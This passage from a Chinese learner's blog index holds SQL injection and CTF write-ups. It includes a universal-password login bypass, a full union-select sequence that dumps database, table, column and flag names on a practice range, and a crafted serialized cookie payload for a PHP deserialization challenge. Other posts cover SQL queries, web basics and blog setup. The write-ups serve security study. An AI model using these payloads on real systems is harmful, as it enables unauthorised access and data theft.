post注入和get注入并没有多大的区别,只是传参方式变了而已.get是在url里面传参,post是在各种框框之中,比如说登录框,查询框,各种和数据库有交互的框之中 万能密码 因为用户登录的时候一般要输入用户名和密码,所以想象一下数据库查询语句可能是select * from table where user=&#39;$user&#39; and pwd=&#39;$pwd&#39;这里就可以通过闭合单引号来实现万能密码.select * from table where user=&#39;&#39;1 or 1=1#&#39; and pwd=&#39;$pwd&#39;这样or 1=1恒成立,用户名不填也没事,而密码已经被注释掉了,填什么也无所谓.这样就变成了一个恒为真的万能密码,就可以再配合order by,limit,select等开始报库 靶场实战 zkaq–writeup:https://wxnsoul.github.io/2020/04/04/POST%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-POST注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"Get注入--zkaq靶场","text":"一段时间没做确实生疏了0.0代码都忘了一部分,最主要的还是会忘记Mysql数据库自带的那几个库名.table_schema,information_schema.tables,information_schema.columns靶场链接:https://hack.zkaq.cn/一上来就可以看出这是get注入,因为在url里面传参id 在后面尝试加入and 1=1 ,or 1=1,and1=2之类的判断select *from user where id=1 and 1=1页面正常返回,在尝试输入select *from user where id=1 and 1=2页面返回错误,这说明就是把用户输入的数据当作代码执行了 再使用order by测试出字段数select *from user where id=1 order by 4)一直到order by 4的时候页面返回错误,所以可以判断出只有三个字段 使用连接查询来判断注入点select *from user where id=1 union select 1,2,3可以得知2,3是注入点 在注入点处替换数据库查询语句,首先爆数据库select *from user where id=1 union select 1,2,database()可以看到数据库名是error 接着爆表select *from user where id=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;error&#39; limit 1,1可以得出表名是error_flag 接着爆字段select *from user where id=1 union select 1,2,column_name from information_schema.columns where table_name=&#39;error_flag&#39; limit 2,1 这个表中一共三个字段,如果不使用limit的话会直接返回最后一个字段.我们可以得出字段是flag 最后爆值select *from user where id=1 union select 1,2,group_concat(flag) from error_flag成功得出flag 总的来说流程就是这样的,剩下两个get注入的靶场也都只要注意下闭合就行,很简单个人打算学完zkaq之后去刷ctf题目,那边的难一点适合提升,有各种过滤,需要去绕过","path":"2020/04/03/Get注入-zkaq靶场/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--原理分析以及Get注入","text":"SQL注入原理分析 注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 显错注入的基本流程 代码流程 使用 and 1=1,or 1=1,sleep等来判断是否可以注入(会不会被当作代码执行,注意闭合) 使用order by判断出字段数 使用select 1,2..开始判断注入点 改变id值使其出错来使得页面有回显或者使用limit 来控制输出条数 select 1,table_name from information_schema.tables where table_schema=database() select 1,column_name from information_schema.columns where table_name = select 1,column_name from table_name limit 0,1 具体实操直接看靶场的write uphttps://wxnsoul.github.io/2020/04/03/Get%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/03/SQL注入-原理分析以及Get注入/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--web安全前端基础","text":"学习编程的意义 黑盒测试:无源码白盒测试:有源码(就比如后面的代码审计模块)记住一句话，我们是学习渗透测试的!不是学习开发的!开发的核心在于写代码渗透测试人员的核心在于看代码[写工具另类]如何学习编程? 1.-定要自己动手2.基础语法逻辑很重要3.不知道如何学习的可以看看菜鸟教程或者W3C这串红色的话真的是克服了我对他的恐惧,以前总是觉得很困难! 前端 HTML基础 )浏览器部分的源码我们可以随意修改,但是刷新时候又变回去了.因为服务器端的数据并没有被修改,就比如:因为浏览器是在我们本地的,所以可以直接修改数据,但是修改不到服务器端的数据 JS学习 Jscript是大大的拓展了前端页面和用户交互的功能，Ｊｓ其实核心就是操作你得浏览器去做其他规定的事情，很明显JS可以操纵你得浏览器，这是一个很危险的事情，所以说如果你执行了恶意的Ｊｓ代码会影响你电脑的安全性可以在设置中禁用ｊｓ有时就会出现漏洞","path":"2020/04/03/zkaq-web安全前端基础/","date":"04-03","excerpt":"","tags":[{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]},{"title":"web服务通信原理","text":"zkaq的课程基本学的差不多了,到这里的时候基本还剩一丢丢部分还没有学习了,waf放入绕过和实战讲解.我不想过于着急去看实战了,毕竟基础不好的话看了等于浪费,于是打算把前面的知识点都复习回顾一边 基本常识 ip就是指地址,ip又分为公网地址和内网地址.比如说自己虚拟机里的ipv4地址,本机的ipv4地址,就是内网地址.比如你家的门牌号那就是个公网地址，X省X市X街道X号，别人看到这个地址就能找到你家内网地址是什么妮，假设你住的是-一个大楼，比如住401房间，那么只有同一个大楼里面的人才能够通过401这个地址找到你的房间吧。其他人根本不知道是哪里的401房间对吧 所以说公网比内网要更加精确,他能直接找到你在哪.内网只是在知道你在哪后继续划分你在这里的具体哪里.前面说到了路由器是划分内网地址的,所以自己本机里的IP地址千万不要以为是公网地址.那么如何查看自己的公网地址呢?直接百度搜索ip就可以了. C段 前面三个值相同,最后一个事0-255就是c段如:114.114.114.0和114.114.114.255 域名 实际上是为了方便记忆所发明的一个字符串标识DNS:讲域名转化为ip的一个协议(对应内容找相应的服务器)因为让你直接去记一个公网ip,去访问,肯定是比较费脑子的.但是你使用域名代替之后,比如www.baidu.com就会很方便的记住了域名等级:有几个点间隔就是几级,联系是二级域名是依附在顶级域名之上的,顶级域名可以扶持N个二级域名 DNS 上面访问域名为什么会访问到对应的ip呢?这就是因为DNS解析协议了.它就是把域名转化成对应的ip地址,然后去访问相应的服务器. 端口 端口是什么呀?端口就像电脑的接口，像USB接口，比如你需要用键盘时候，你要把键盘插入接口，端口就是类似的东西，端口主要是网络接口，比如你去访问别人网站，一般来说你实际上是去他的80端口进行通信。我们有多少个端口妮?有范围是从0到65535 (2^16-1)0端口是预留端口。一般不会用到 cookie(不安全) 是服务器给你的代表你身份的一串字符串.为了提升用户体验的,但是越便捷的东西越不安全 web容器 是可以向发出请求的浏览器提供文档的程序(其实我们访问IP时访问到的就是web容器)(是一个被动的程序)常见的web容器:IIS(WINDOWS)Apache(全平台)Nginx(全平台)Tomcat 动态语言 定义:是对服务器行为的编程,这被称为服务器脚本或服务器端脚本作用: 动态地向web页面编辑、改变或添加任何的内容 对由HTML表单提交的用户请求或数据进行响应 访问数据或数据库，并向浏览器返回结果 为不同的用户定制页面 提高网页安全性，使您的网页代码不会通过浏览器被查看到常见的服务器脚本: 搭建一个网站 安装web容器(Apache) 安装静态语言(PHP) 安装数据库(Mysql)嫌弃麻烦,所以有人出了集成,如宝塔,phpstudy(php5.4.45+Apache用的比较多) 其中index.php是默认的根目录 动手搭建实践碰到的问题 重新回顾视频得时候发现原来可以通过主机来访问虚拟机得IP地址,但是ping虚拟机却一直不能成功,原因是没有关闭虚拟机里的两个防火墙 勾取允许目录列表之后却不能访问到目录,原因是没有把l.php给删掉.(l.php就是探针,更目录下的默认访问页面,就像打开phpmyadmin一样index是默认页面)在conf里面得vhost可以改配置文件 增加新的站点时尝试过多次后发现,根目录不可以用于网页地址,如单单的一个E:,或者C: 后期发现sql服务会占用8080端口,所以自己不在本机装phpstudy了,关闭服务都嫌弃麻烦","path":"2020/04/03/web服务通信原理/","date":"04-03","excerpt":"","tags":[{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"}]},{"title":"SQL语句--空值及其处理","text":"什么是空值 空值从技术上来说就是“未知的值”。但空值并不包括零、一个或者多个空格组成的字符串、以及零长度的字符串. 检测空值 因为空值是代表未知的值，所以并不是所有的空值都相等。例如student表中有两个学生的出生日期未知，但无法证明这两个学生的年龄相等。这样就不能用“=”运算符来检测空值。所以T-SQL引入了一个特殊的操作符IS来检侧特殊值之间的等价性。检测空值的使用语法如下： WHERE 表达式 IS NULL检测非空值的使用语法如下： WHERE 表达式 IS NOT NULL 处理空值 为了将空值转换为一个有效的值，以便于对数据理解，或者防止表达式出错。SQL Server专门提供了ISNULL函数将空值转换为有效的值，其使用语法格式如下： ISNULL(check_expr,repl_value）其中，check_expr是指被检查是否为NULL的表达式，可以是任何数据类型。repl_value是在check_expr为NULL时用其值替换NULL值，需与check_expr具有相同的类型。就像replace函数","path":"2020/04/02/SQL语句-空值及其处理/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--子查询","text":"子查询简单子查询 当一个查询是另一个查询的条件时，称之为子查询。子查询可以使用几个简单命令构造功能强大的复合命令。子查询可以嵌套。 嵌套查询的过程是：首先执行内部查询，它查询出来的数据并不被显示出来，而是传递给外层语句（亦称主查询），并作为外层语句的查询条件来使用。 相关子查询 在前面的例子中，子查询都仅执行一次，并将得到的值代入外部查询的WHERE子句中进行计算，这样的子查询称之为非相关子查询，非相关子查询是独立于外部查询的子查询。 而有些查询中，子查询依靠外部查询获得值，这意味着子查询是重复执行的，为外部查询可能选择的每一行均执行一次，这样的子查询称之为相关子查询（也称为重复子查询）。 就是说相关子查询不会像非相关得那样只查询一次,而是分组后每一行都会区查询一遍,有点像group by使每一行有一个聚合值,求每一…都满足….得时候就可以使用 复杂子查询 如果一个子查询返回的不止一个值，将其称之为复杂子查询。主要有如下3种常用的复杂子查询： 使用IN或NOT IN引入子查询。其基本格式为：WHERE 表达式 [NOT] IN (子查询)。 使用ANY或ALL。其基本格式为：WHERE 表达式 比较运算符 [ANY | 3. ALL] (子查询)。其中，ANY表示任意一个，ALL表示所有的。使用EXISTS引入存在测试。其基本格式为：WHERE [NOT] EXISTS (子查询)。 (1)in 和 not in 通过IN（或NOT IN）引入的子查询返回结果是一个集合，该集合可以为空或者含有多个值。子查询返回结果之后，外部查询将利用这些结果。就是说在子查询得到的结果集中查找或者不在子查询得到的结果集中进行查找 (2)any 和 all ANY或ALL通常与关系运算符连用，这时的子查询返回结果是一个集合，如&gt; ANY(子查询)表示大于该集合中任意一个值时为真，而&gt; ALL(子查询)表示大于该集合中所有值时为真。应该还是很好理解的 (3)exists EXISTS后紧跟一个SQL子查询，从而构成一个条件，当该子查询至少存在一个返回值时，这个条件为真，否则为假。NOT EXISTS与之相反，当该子查询至少存在一个返回值时，这个条件为假，否则为真。也很好理解 多层嵌套 子查询可以嵌套在外部SELECT、INSERT、UPDATE或DELETE语句的WHERE或HAVING子句内，或者其他子查询中。尽管根据可用内存和查询中其他表达式的复杂程度不同，嵌套限制也有所不同，但一般均可以嵌套到32层。这个是两层嵌套,查找考了最高分学生的姓名班级要先查找最高分,然后找到他的学号,再根据学号找到姓名班级 查询结果的并 T-SQL命令还提供了UNION子句，它可以将多个SELECT命令连接起来生成单个SQL无法做到的结果集合。这就是sql注入里面常用的union查询,他要求结果集的列数相同,这样才能够吧所有的结果合并到一起 数据来源是一个查询的结果 在查询语句中，FROM指定数据来源，它可以是一个或多个表。实际上，由FROM指定的数据来源也可以是一个SELECT查询的结果。用到了数据来源是一个嵌套结果,自连接,排序,聚合","path":"2020/04/02/SQL语句-子查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--连接查询","text":"1.简单连接查询 在一个查询中，当需要对两个或多个表连接时，可以指定连接列，在WHERE子句中给出连接条件，在FROM子句中指定要连接的表，其格式如下： SELECT 列名1，列名2，… FROM 表1，表2，… WHERE 连接条件 对于连接的多个表通常存在公共列，为了区别是哪个表中的列，在连接条件中通过表名前缀指定连接列。例如，“teacher.编号”表示teacher表的编号列，“student.学号”表示student表的学号列，由此来区别连接列所在的表。 (1)等值连接 所谓等值连接，是指表之间通过“等于”关系连接起来，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。 (2)非等值连接 所谓非等值连接，是指表之间的连接关系不是“等于”，而是其他关系。通过指定的非等值关系将两个表连接起来的，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。就比如这个between and (3)自连接 在数据查询中有时需要将同一个表进行连接，这种连接称之为自连接，进行自连接就如同两个分开的表一样，可以把一个表的某行与同一表中的另一行连接起来。 这个自连接就是自己和自己连接比较,所以需要用到x,y来区分 复杂连接查询 在SELECT的FROM子句中指定连接条件，有助于将这些连接条件与WHERE子句中可能指定的其他搜索条件分开，其连接语法如下： FROM 第一个表名 连接类型 第二个表名 [ON (连接条件)]根据连接条件分为内连接、外连接和交叉连接等复杂连接查询类型举例: 其实就是取交集得意思 (2)外连接 外连接会返回FROM子句中提到的至少一个表或视图的所有行，只要这些行符合任何WHERE或HAVING搜索条件。外连接检索通过左外连接引用的左表的所有行，以及通过右外连接引用的右表的所有行,而全外连接中两个表的所有行都将返回。 LEFT OUTER JOIN或LEFT JOIN（左外连接） RIGHT OUTER JOIN或RIGHT JOIN（右外连接） FULL OUTER JOIN或FULL JOIN（全外连接） (3)左外连接 左外连接简称为左连接，其结果包括第一个表（“左”表，出现在JOIN子句的最左边）中的所有行，不包括右表中的不匹配行。举例:说白了就是1-5是内连接得结果,6是把左表不满足条件得也加进来(会显示null) (4)右外连接 右外连接简称为右连接，其结果中包括第二个表（“右”表，出现在JOIN子句的最右边）中的所有行，不包括左表中的不匹配行。 举例: (5)全外连接若要通过在连接结果中包括不匹配的行保留不匹配信息，可以使用全外连接。SQL Server提供全外连接运算符FULL OUTER JOIN，不管另一个表是否有匹配的值，此运算符都包括两个表中的所有行。 举例:这就是左右外连接得结合其实 (6)交叉连接在这类连接的结果集内，两个表中每两个可能成对的行占一行。交叉连接不使用WHERE子句。 在数学上，就是表的笛卡尔积。第一个表的行数乘以第二个表的行数等于笛卡尔积结果集的大小。笛卡儿积","path":"2020/04/02/SQL语句-连接查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--聚合函数","text":"功能 聚合函数实现数据统计等功能，用于对一组值进行计算并返回一个单一的值，除COUNT函数外，聚合函数忽略空值。聚合函数常与SELECT语句的GROUP BY子句一起使用。 #常用的聚合函数# 聚合参数得一般格式 其中，ALL表示对所有值进行聚合函数运算，它是默认值；DISTINCT指定每个唯一值都被考虑；expr指定进行聚合函数运算的表达式。 举例 作用范围 通常一个聚合函数的范围是满足WHERE子句指定的条件的所有记录。在加上GROUP BY子句后，SQL命令把查询结果按指定列分成集合组。当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。使用HAVING子句可以对这些组进一步加以控制。用这一子句定义这些组所必须满足的条件，以便将其包含在结果中。当WHERE子句、GROUP BY子句和HAVING子句同时出现在一个查询中时，SQL的执行顺序如下： 执行WHERE子句，从表中选取行。 由GROUP BY对选取的行进行分组。 执行聚合函数。 执行HAVING子句选取满足条件的分组。 聚合函数:AS 说一说这个as得作用,第一列得值是课程号,因为select 课程号,但是第二列是一个聚合函数,所以需要as来做一个别名再来说聚合函数max得作用,就像上面说的,聚合函数得范围由所有得变为每组得所有记录,也就是说它先去找3-105这一组里面得最高分,再去找3-245,以此类推,从而达到了寻找每一门课得最高分要求 group by子句 GROUP BY子句用来为结果集中的每一行产生聚合值。如果聚合函数没有使用GROUP BY子句，则只为SELECT语句报告一个聚合值。指定GROUP BY时，选择列表中任一非聚合表达式内的所有列都应包含在GROUP BY列表中，或者GROUP BY表达式必须与选择列表表达式完全匹配。 简单地说就是不使用group by就对整个结果集做聚合函数运算,用了就按组划分,做聚合函数运算 HAVING子句 在SELECT查询中，在给定分组GROUP BY子句后，可以通过HAVING子句中使用聚合函数来进行分组条件判断。就是说使用了group by需要用到聚合函数作为筛选条件,就得用having.并且,使用聚合函数返回得值应该是唯一得!!! select cnum,score as ‘及格以上’ from score group by cnum having min(score)&gt;=60我在自己得数据库中这样写尝试找出所有最低分大于60得学生得学号和所有分数.这样是错的!因为返回得学号都是单一得,但是所有大于60得科目肯定不止一课!不是唯一值!!只能这么改select cnum from score group by cnum having min(score)&gt;=60找出最低分&gt;60得学生得学号,肯定是单一的 总结要点当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。并且,使用聚合函数返回得值应该是唯一得!!!对一组值进行计算并返回一个单一的值!!!","path":"2020/04/02/SQL语句-聚合函数/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"关于markdown2","text":"初步理解markdown就是一个编译器,在一次查阅时有了一个清晰得认识 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过类似HTML的标记语法，它可以使普通文本内容具有一定的格式。但是它本身是不支持修改字体、字号与颜色等功能的！ CSDN-markdown编辑器是其衍生版本，扩展了Markdown的功能（如表格、脚注、内嵌HTML等等）！ 所以说,其实markdown2是方便用于直接编写html页面得一个编辑器,是可以接受heml标签得,想要调整字体得颜色大小直接使用html标签即可 &lt;font color=&quot;&quot;&gt;&lt;/font&gt;","path":"2020/04/02/关于markdown2/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"使用七牛云来上传图片","text":"mpic使用学习:https://www.jianshu.com/p/7c537ccf18f9 一开始使用在github上建仓库然后使用git上传在获取链接,这样子上传图片真的是麻烦的不得了,在了解了mpic之后,,,,啊啊啊啊,真的方便,使用图片跟word里面差不错了,甚至还可以直接上传QQ截图和复制的图片自动上传…真是6666 只不过你需要打开这些功能 可惜七牛云上面的开辟的空间只有30天可用时间,得自己去注册一个才可以无限用下去.我自己去阿里云注册了个域名 选一个自己喜欢后缀,合适得价位买一个就好. 但是买完之后不去备案得花是不能够使用得,,还得先去备案.备案推荐这篇文章,写的很详细:https://blog.51cto.com/13373096/2339036中间自己碰到了几个坑总结一下:备案前提 网站备案前提准备：1、备案域名，准备需要备案的域名（域名可以不在阿里云），域名需要实名认证（个人域名就个人认证，企业域名就企业认证），域名备案主体要与实名认证信息相符合。 2、备案服务号，在阿里云备案需要备案服务号，购买阿里云大陆地域的ECS云服务器、虚拟主机、轻量应用服务器等就可以申请备案号，如何申请备案号参考：阿里云备案服务号申请方法及说明 3、备案材料，个人备案需要×××图片、《网站备案真实性核验单》（核验单在备案过程中即可下载，按照流程操作即可），由于当地管局备案规则不同，有可能还需要域名证书，域名证书需要去域名注册商网站上获取。企业备案需要营业执照、备案负责人和网站负责人×××件照片、《网站备案真实性核验单》，另外，由于当地管局备案规则不同，有可能需要其他证明材料，例如域名证书、法定代表人委托授权书等，按照要求准备材料即可。 备案域名就有坑,你实名注册之后,其实是还需要等待三天才是真正得注册完成工信部那边还没跟新你的消息,所以后面我备案死活进行不下去 备案服务号也是,需要你有服务器才可以去申请,但是我只买了个域名(其实如果是学生得花可以去买个学生机,不贵,9.5一个月)但是当时自己没想买,就百度到了一个公众号花9.9买了一个备案服务号然后选择使用备案服务号可以","path":"2020/04/02/使用七牛云来上传图片/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"zkaq--序列化与反序列化","text":"定义:序列化是将对象的状态信息转换为可以存储或传输的形式的过程 代码为： serialize ( mixed $value )反序列化则相反，代码为：unserialize ( string $str )如果只是这样，那么应该没有什么可以利用的漏洞。然而，serialize ( mixed $value )与unserialize ( string $str )这两个函数在使用时，会自动使用一些魔法函数，以及，如果在定义的类内存在魔法函数，也会自动调用 也就是说,序列化与反序列化必须要配合一些魔法函数才能发挥作用 反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。 函数介绍 变量 FILE这是用于返回当前访问得文件得目录的 show_source()函数###用于显示页面源代码的,括号中填路径,配合FILE使用就是显示当前页面的源代码 魔法函数__toString###__toString() 是魔术方法的一种，具体用途是当一个对象被当作字符串对待的时候，会触发这个魔术方法以下说明摘自PHP官方手册public string __toString ( void )__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。Warning不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 *输出字符串时是不会触发的,把类当字符串输出才会触发* ###其余常用的魔法函数### writeup题解 这是题目的源码,很明显是代码审计第一行可以得知flag在./flag.php中访问一下什么也没有,检查源代码也没有.这说明服务器端的php代码并没有输出值.需要用到show_resource才能看到flag 思路Highlight_file(,true)就是确认开启代码高亮引用了一个魔术方法toString,检测到把类当初字符串输出后就会会把readme.txt和$this-&gt;source拼接在一起输出.源码中赋值的是FILE__所以这个页面会输出源码,如果我们把source的赋值变成flag.php把岂不是也能输出flag了?而全文就只有一个输出类的地方似乎就是检测get传参的那边.他会把当前文件的路径名传给resource变量然后输出.但其实还有一个输出的点,那就是就相当于echo $tode 这里很明显是把数组todos遍历输出在cookie传参的时候会有用到todos,会把m反序列化之后传给todos,但是这时候的todos并不是数组,所以只要强行给m值加上一个中括号,这样todos就变成了一个数组变量S是已经无法修改了只能是赋值FILE,所以得在另外一个输出点下手.Cookie判断里,substr($a,32)和substr($a,0,32)前者是从$a第32位之后开始取值,后者是取值前32. &nbsp如果h=md5(m)就会给todos赋值,c是我们可以控制的,这说明c应该是由md5(m).m构成,这样就变成了md5(m)==md5(m),而m会被反序列化,说明c的后32位应该先序列化.只要把我们想要的flag.php序列化,然后给m,todos输出就会得到源码.但是todos必须是数组才会输出,所以得给readme对象再加一个[],然后再去序列化 这里的a指数组,i指第几个元素,0就是第零个这里的序列化是非常的关键的!!!必须使用readme类,source变量!!!这样反序列化之后就相当于给这个类的source复制成自己想要的了! 的时候就能输出源码了因为只有readme类里面才有这个__toString函数!这个函数也只输出source变量的源码!我们把序列化之后的字符串md5加密,得到e2d4f7dcc43ee1db7f69e76303d0105c把他们拼接在一起得到e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}},todos就能执行foreach,在cookie中被反序列化后就是一个有着信息的数组类,在foreach中输出.就会触发toString.这边有个小提示,cookie传参和get传参一样,是会先进行url编码的,所以得先编码再传参cookie,用burp抓包修改. e2d4f7dcc43ee1db7f69e76303d0105ca%3a1%3a%7bi%3a0%3bO%3a6%3a%22readme%22%3a1%3a%7bs%3a6%3a%22source%22%3bs%3a8%3a%22flag.php%22%3b%7d%7d 紧接着抓包修改页面,把cookie值改成上面一串,成功得到flag 总结cookie传过去之后的流程: if(isset($COOKIE[‘todos’]))接收到cookie里的todos传参,为真进入if判断 然后把todos值赋给了$c,$h接收了$c的前32位,$m接收了$c的从第33位到结束所有的 把$m md5加密后与$h比较发现是一样的,就将$m反序列化,此时得到的就是[$readme],它是一个数组,数组中是一个readme对象,source的值是flag.php 因为没有get,post传参所以直接往下执行,直接遍历输出todos,输出readme类之后就会触发__toString魔术方法,自动输出该方法里的source页面的代码,和readme.txt拼接在一起后输出 得到了flag","path":"2020/04/01/zkaq-序列化与反序列化/","date":"04-01","excerpt":"","tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}],"categories":[],"tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"},{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"},{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"},{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"},{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"},{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"},{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"},{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}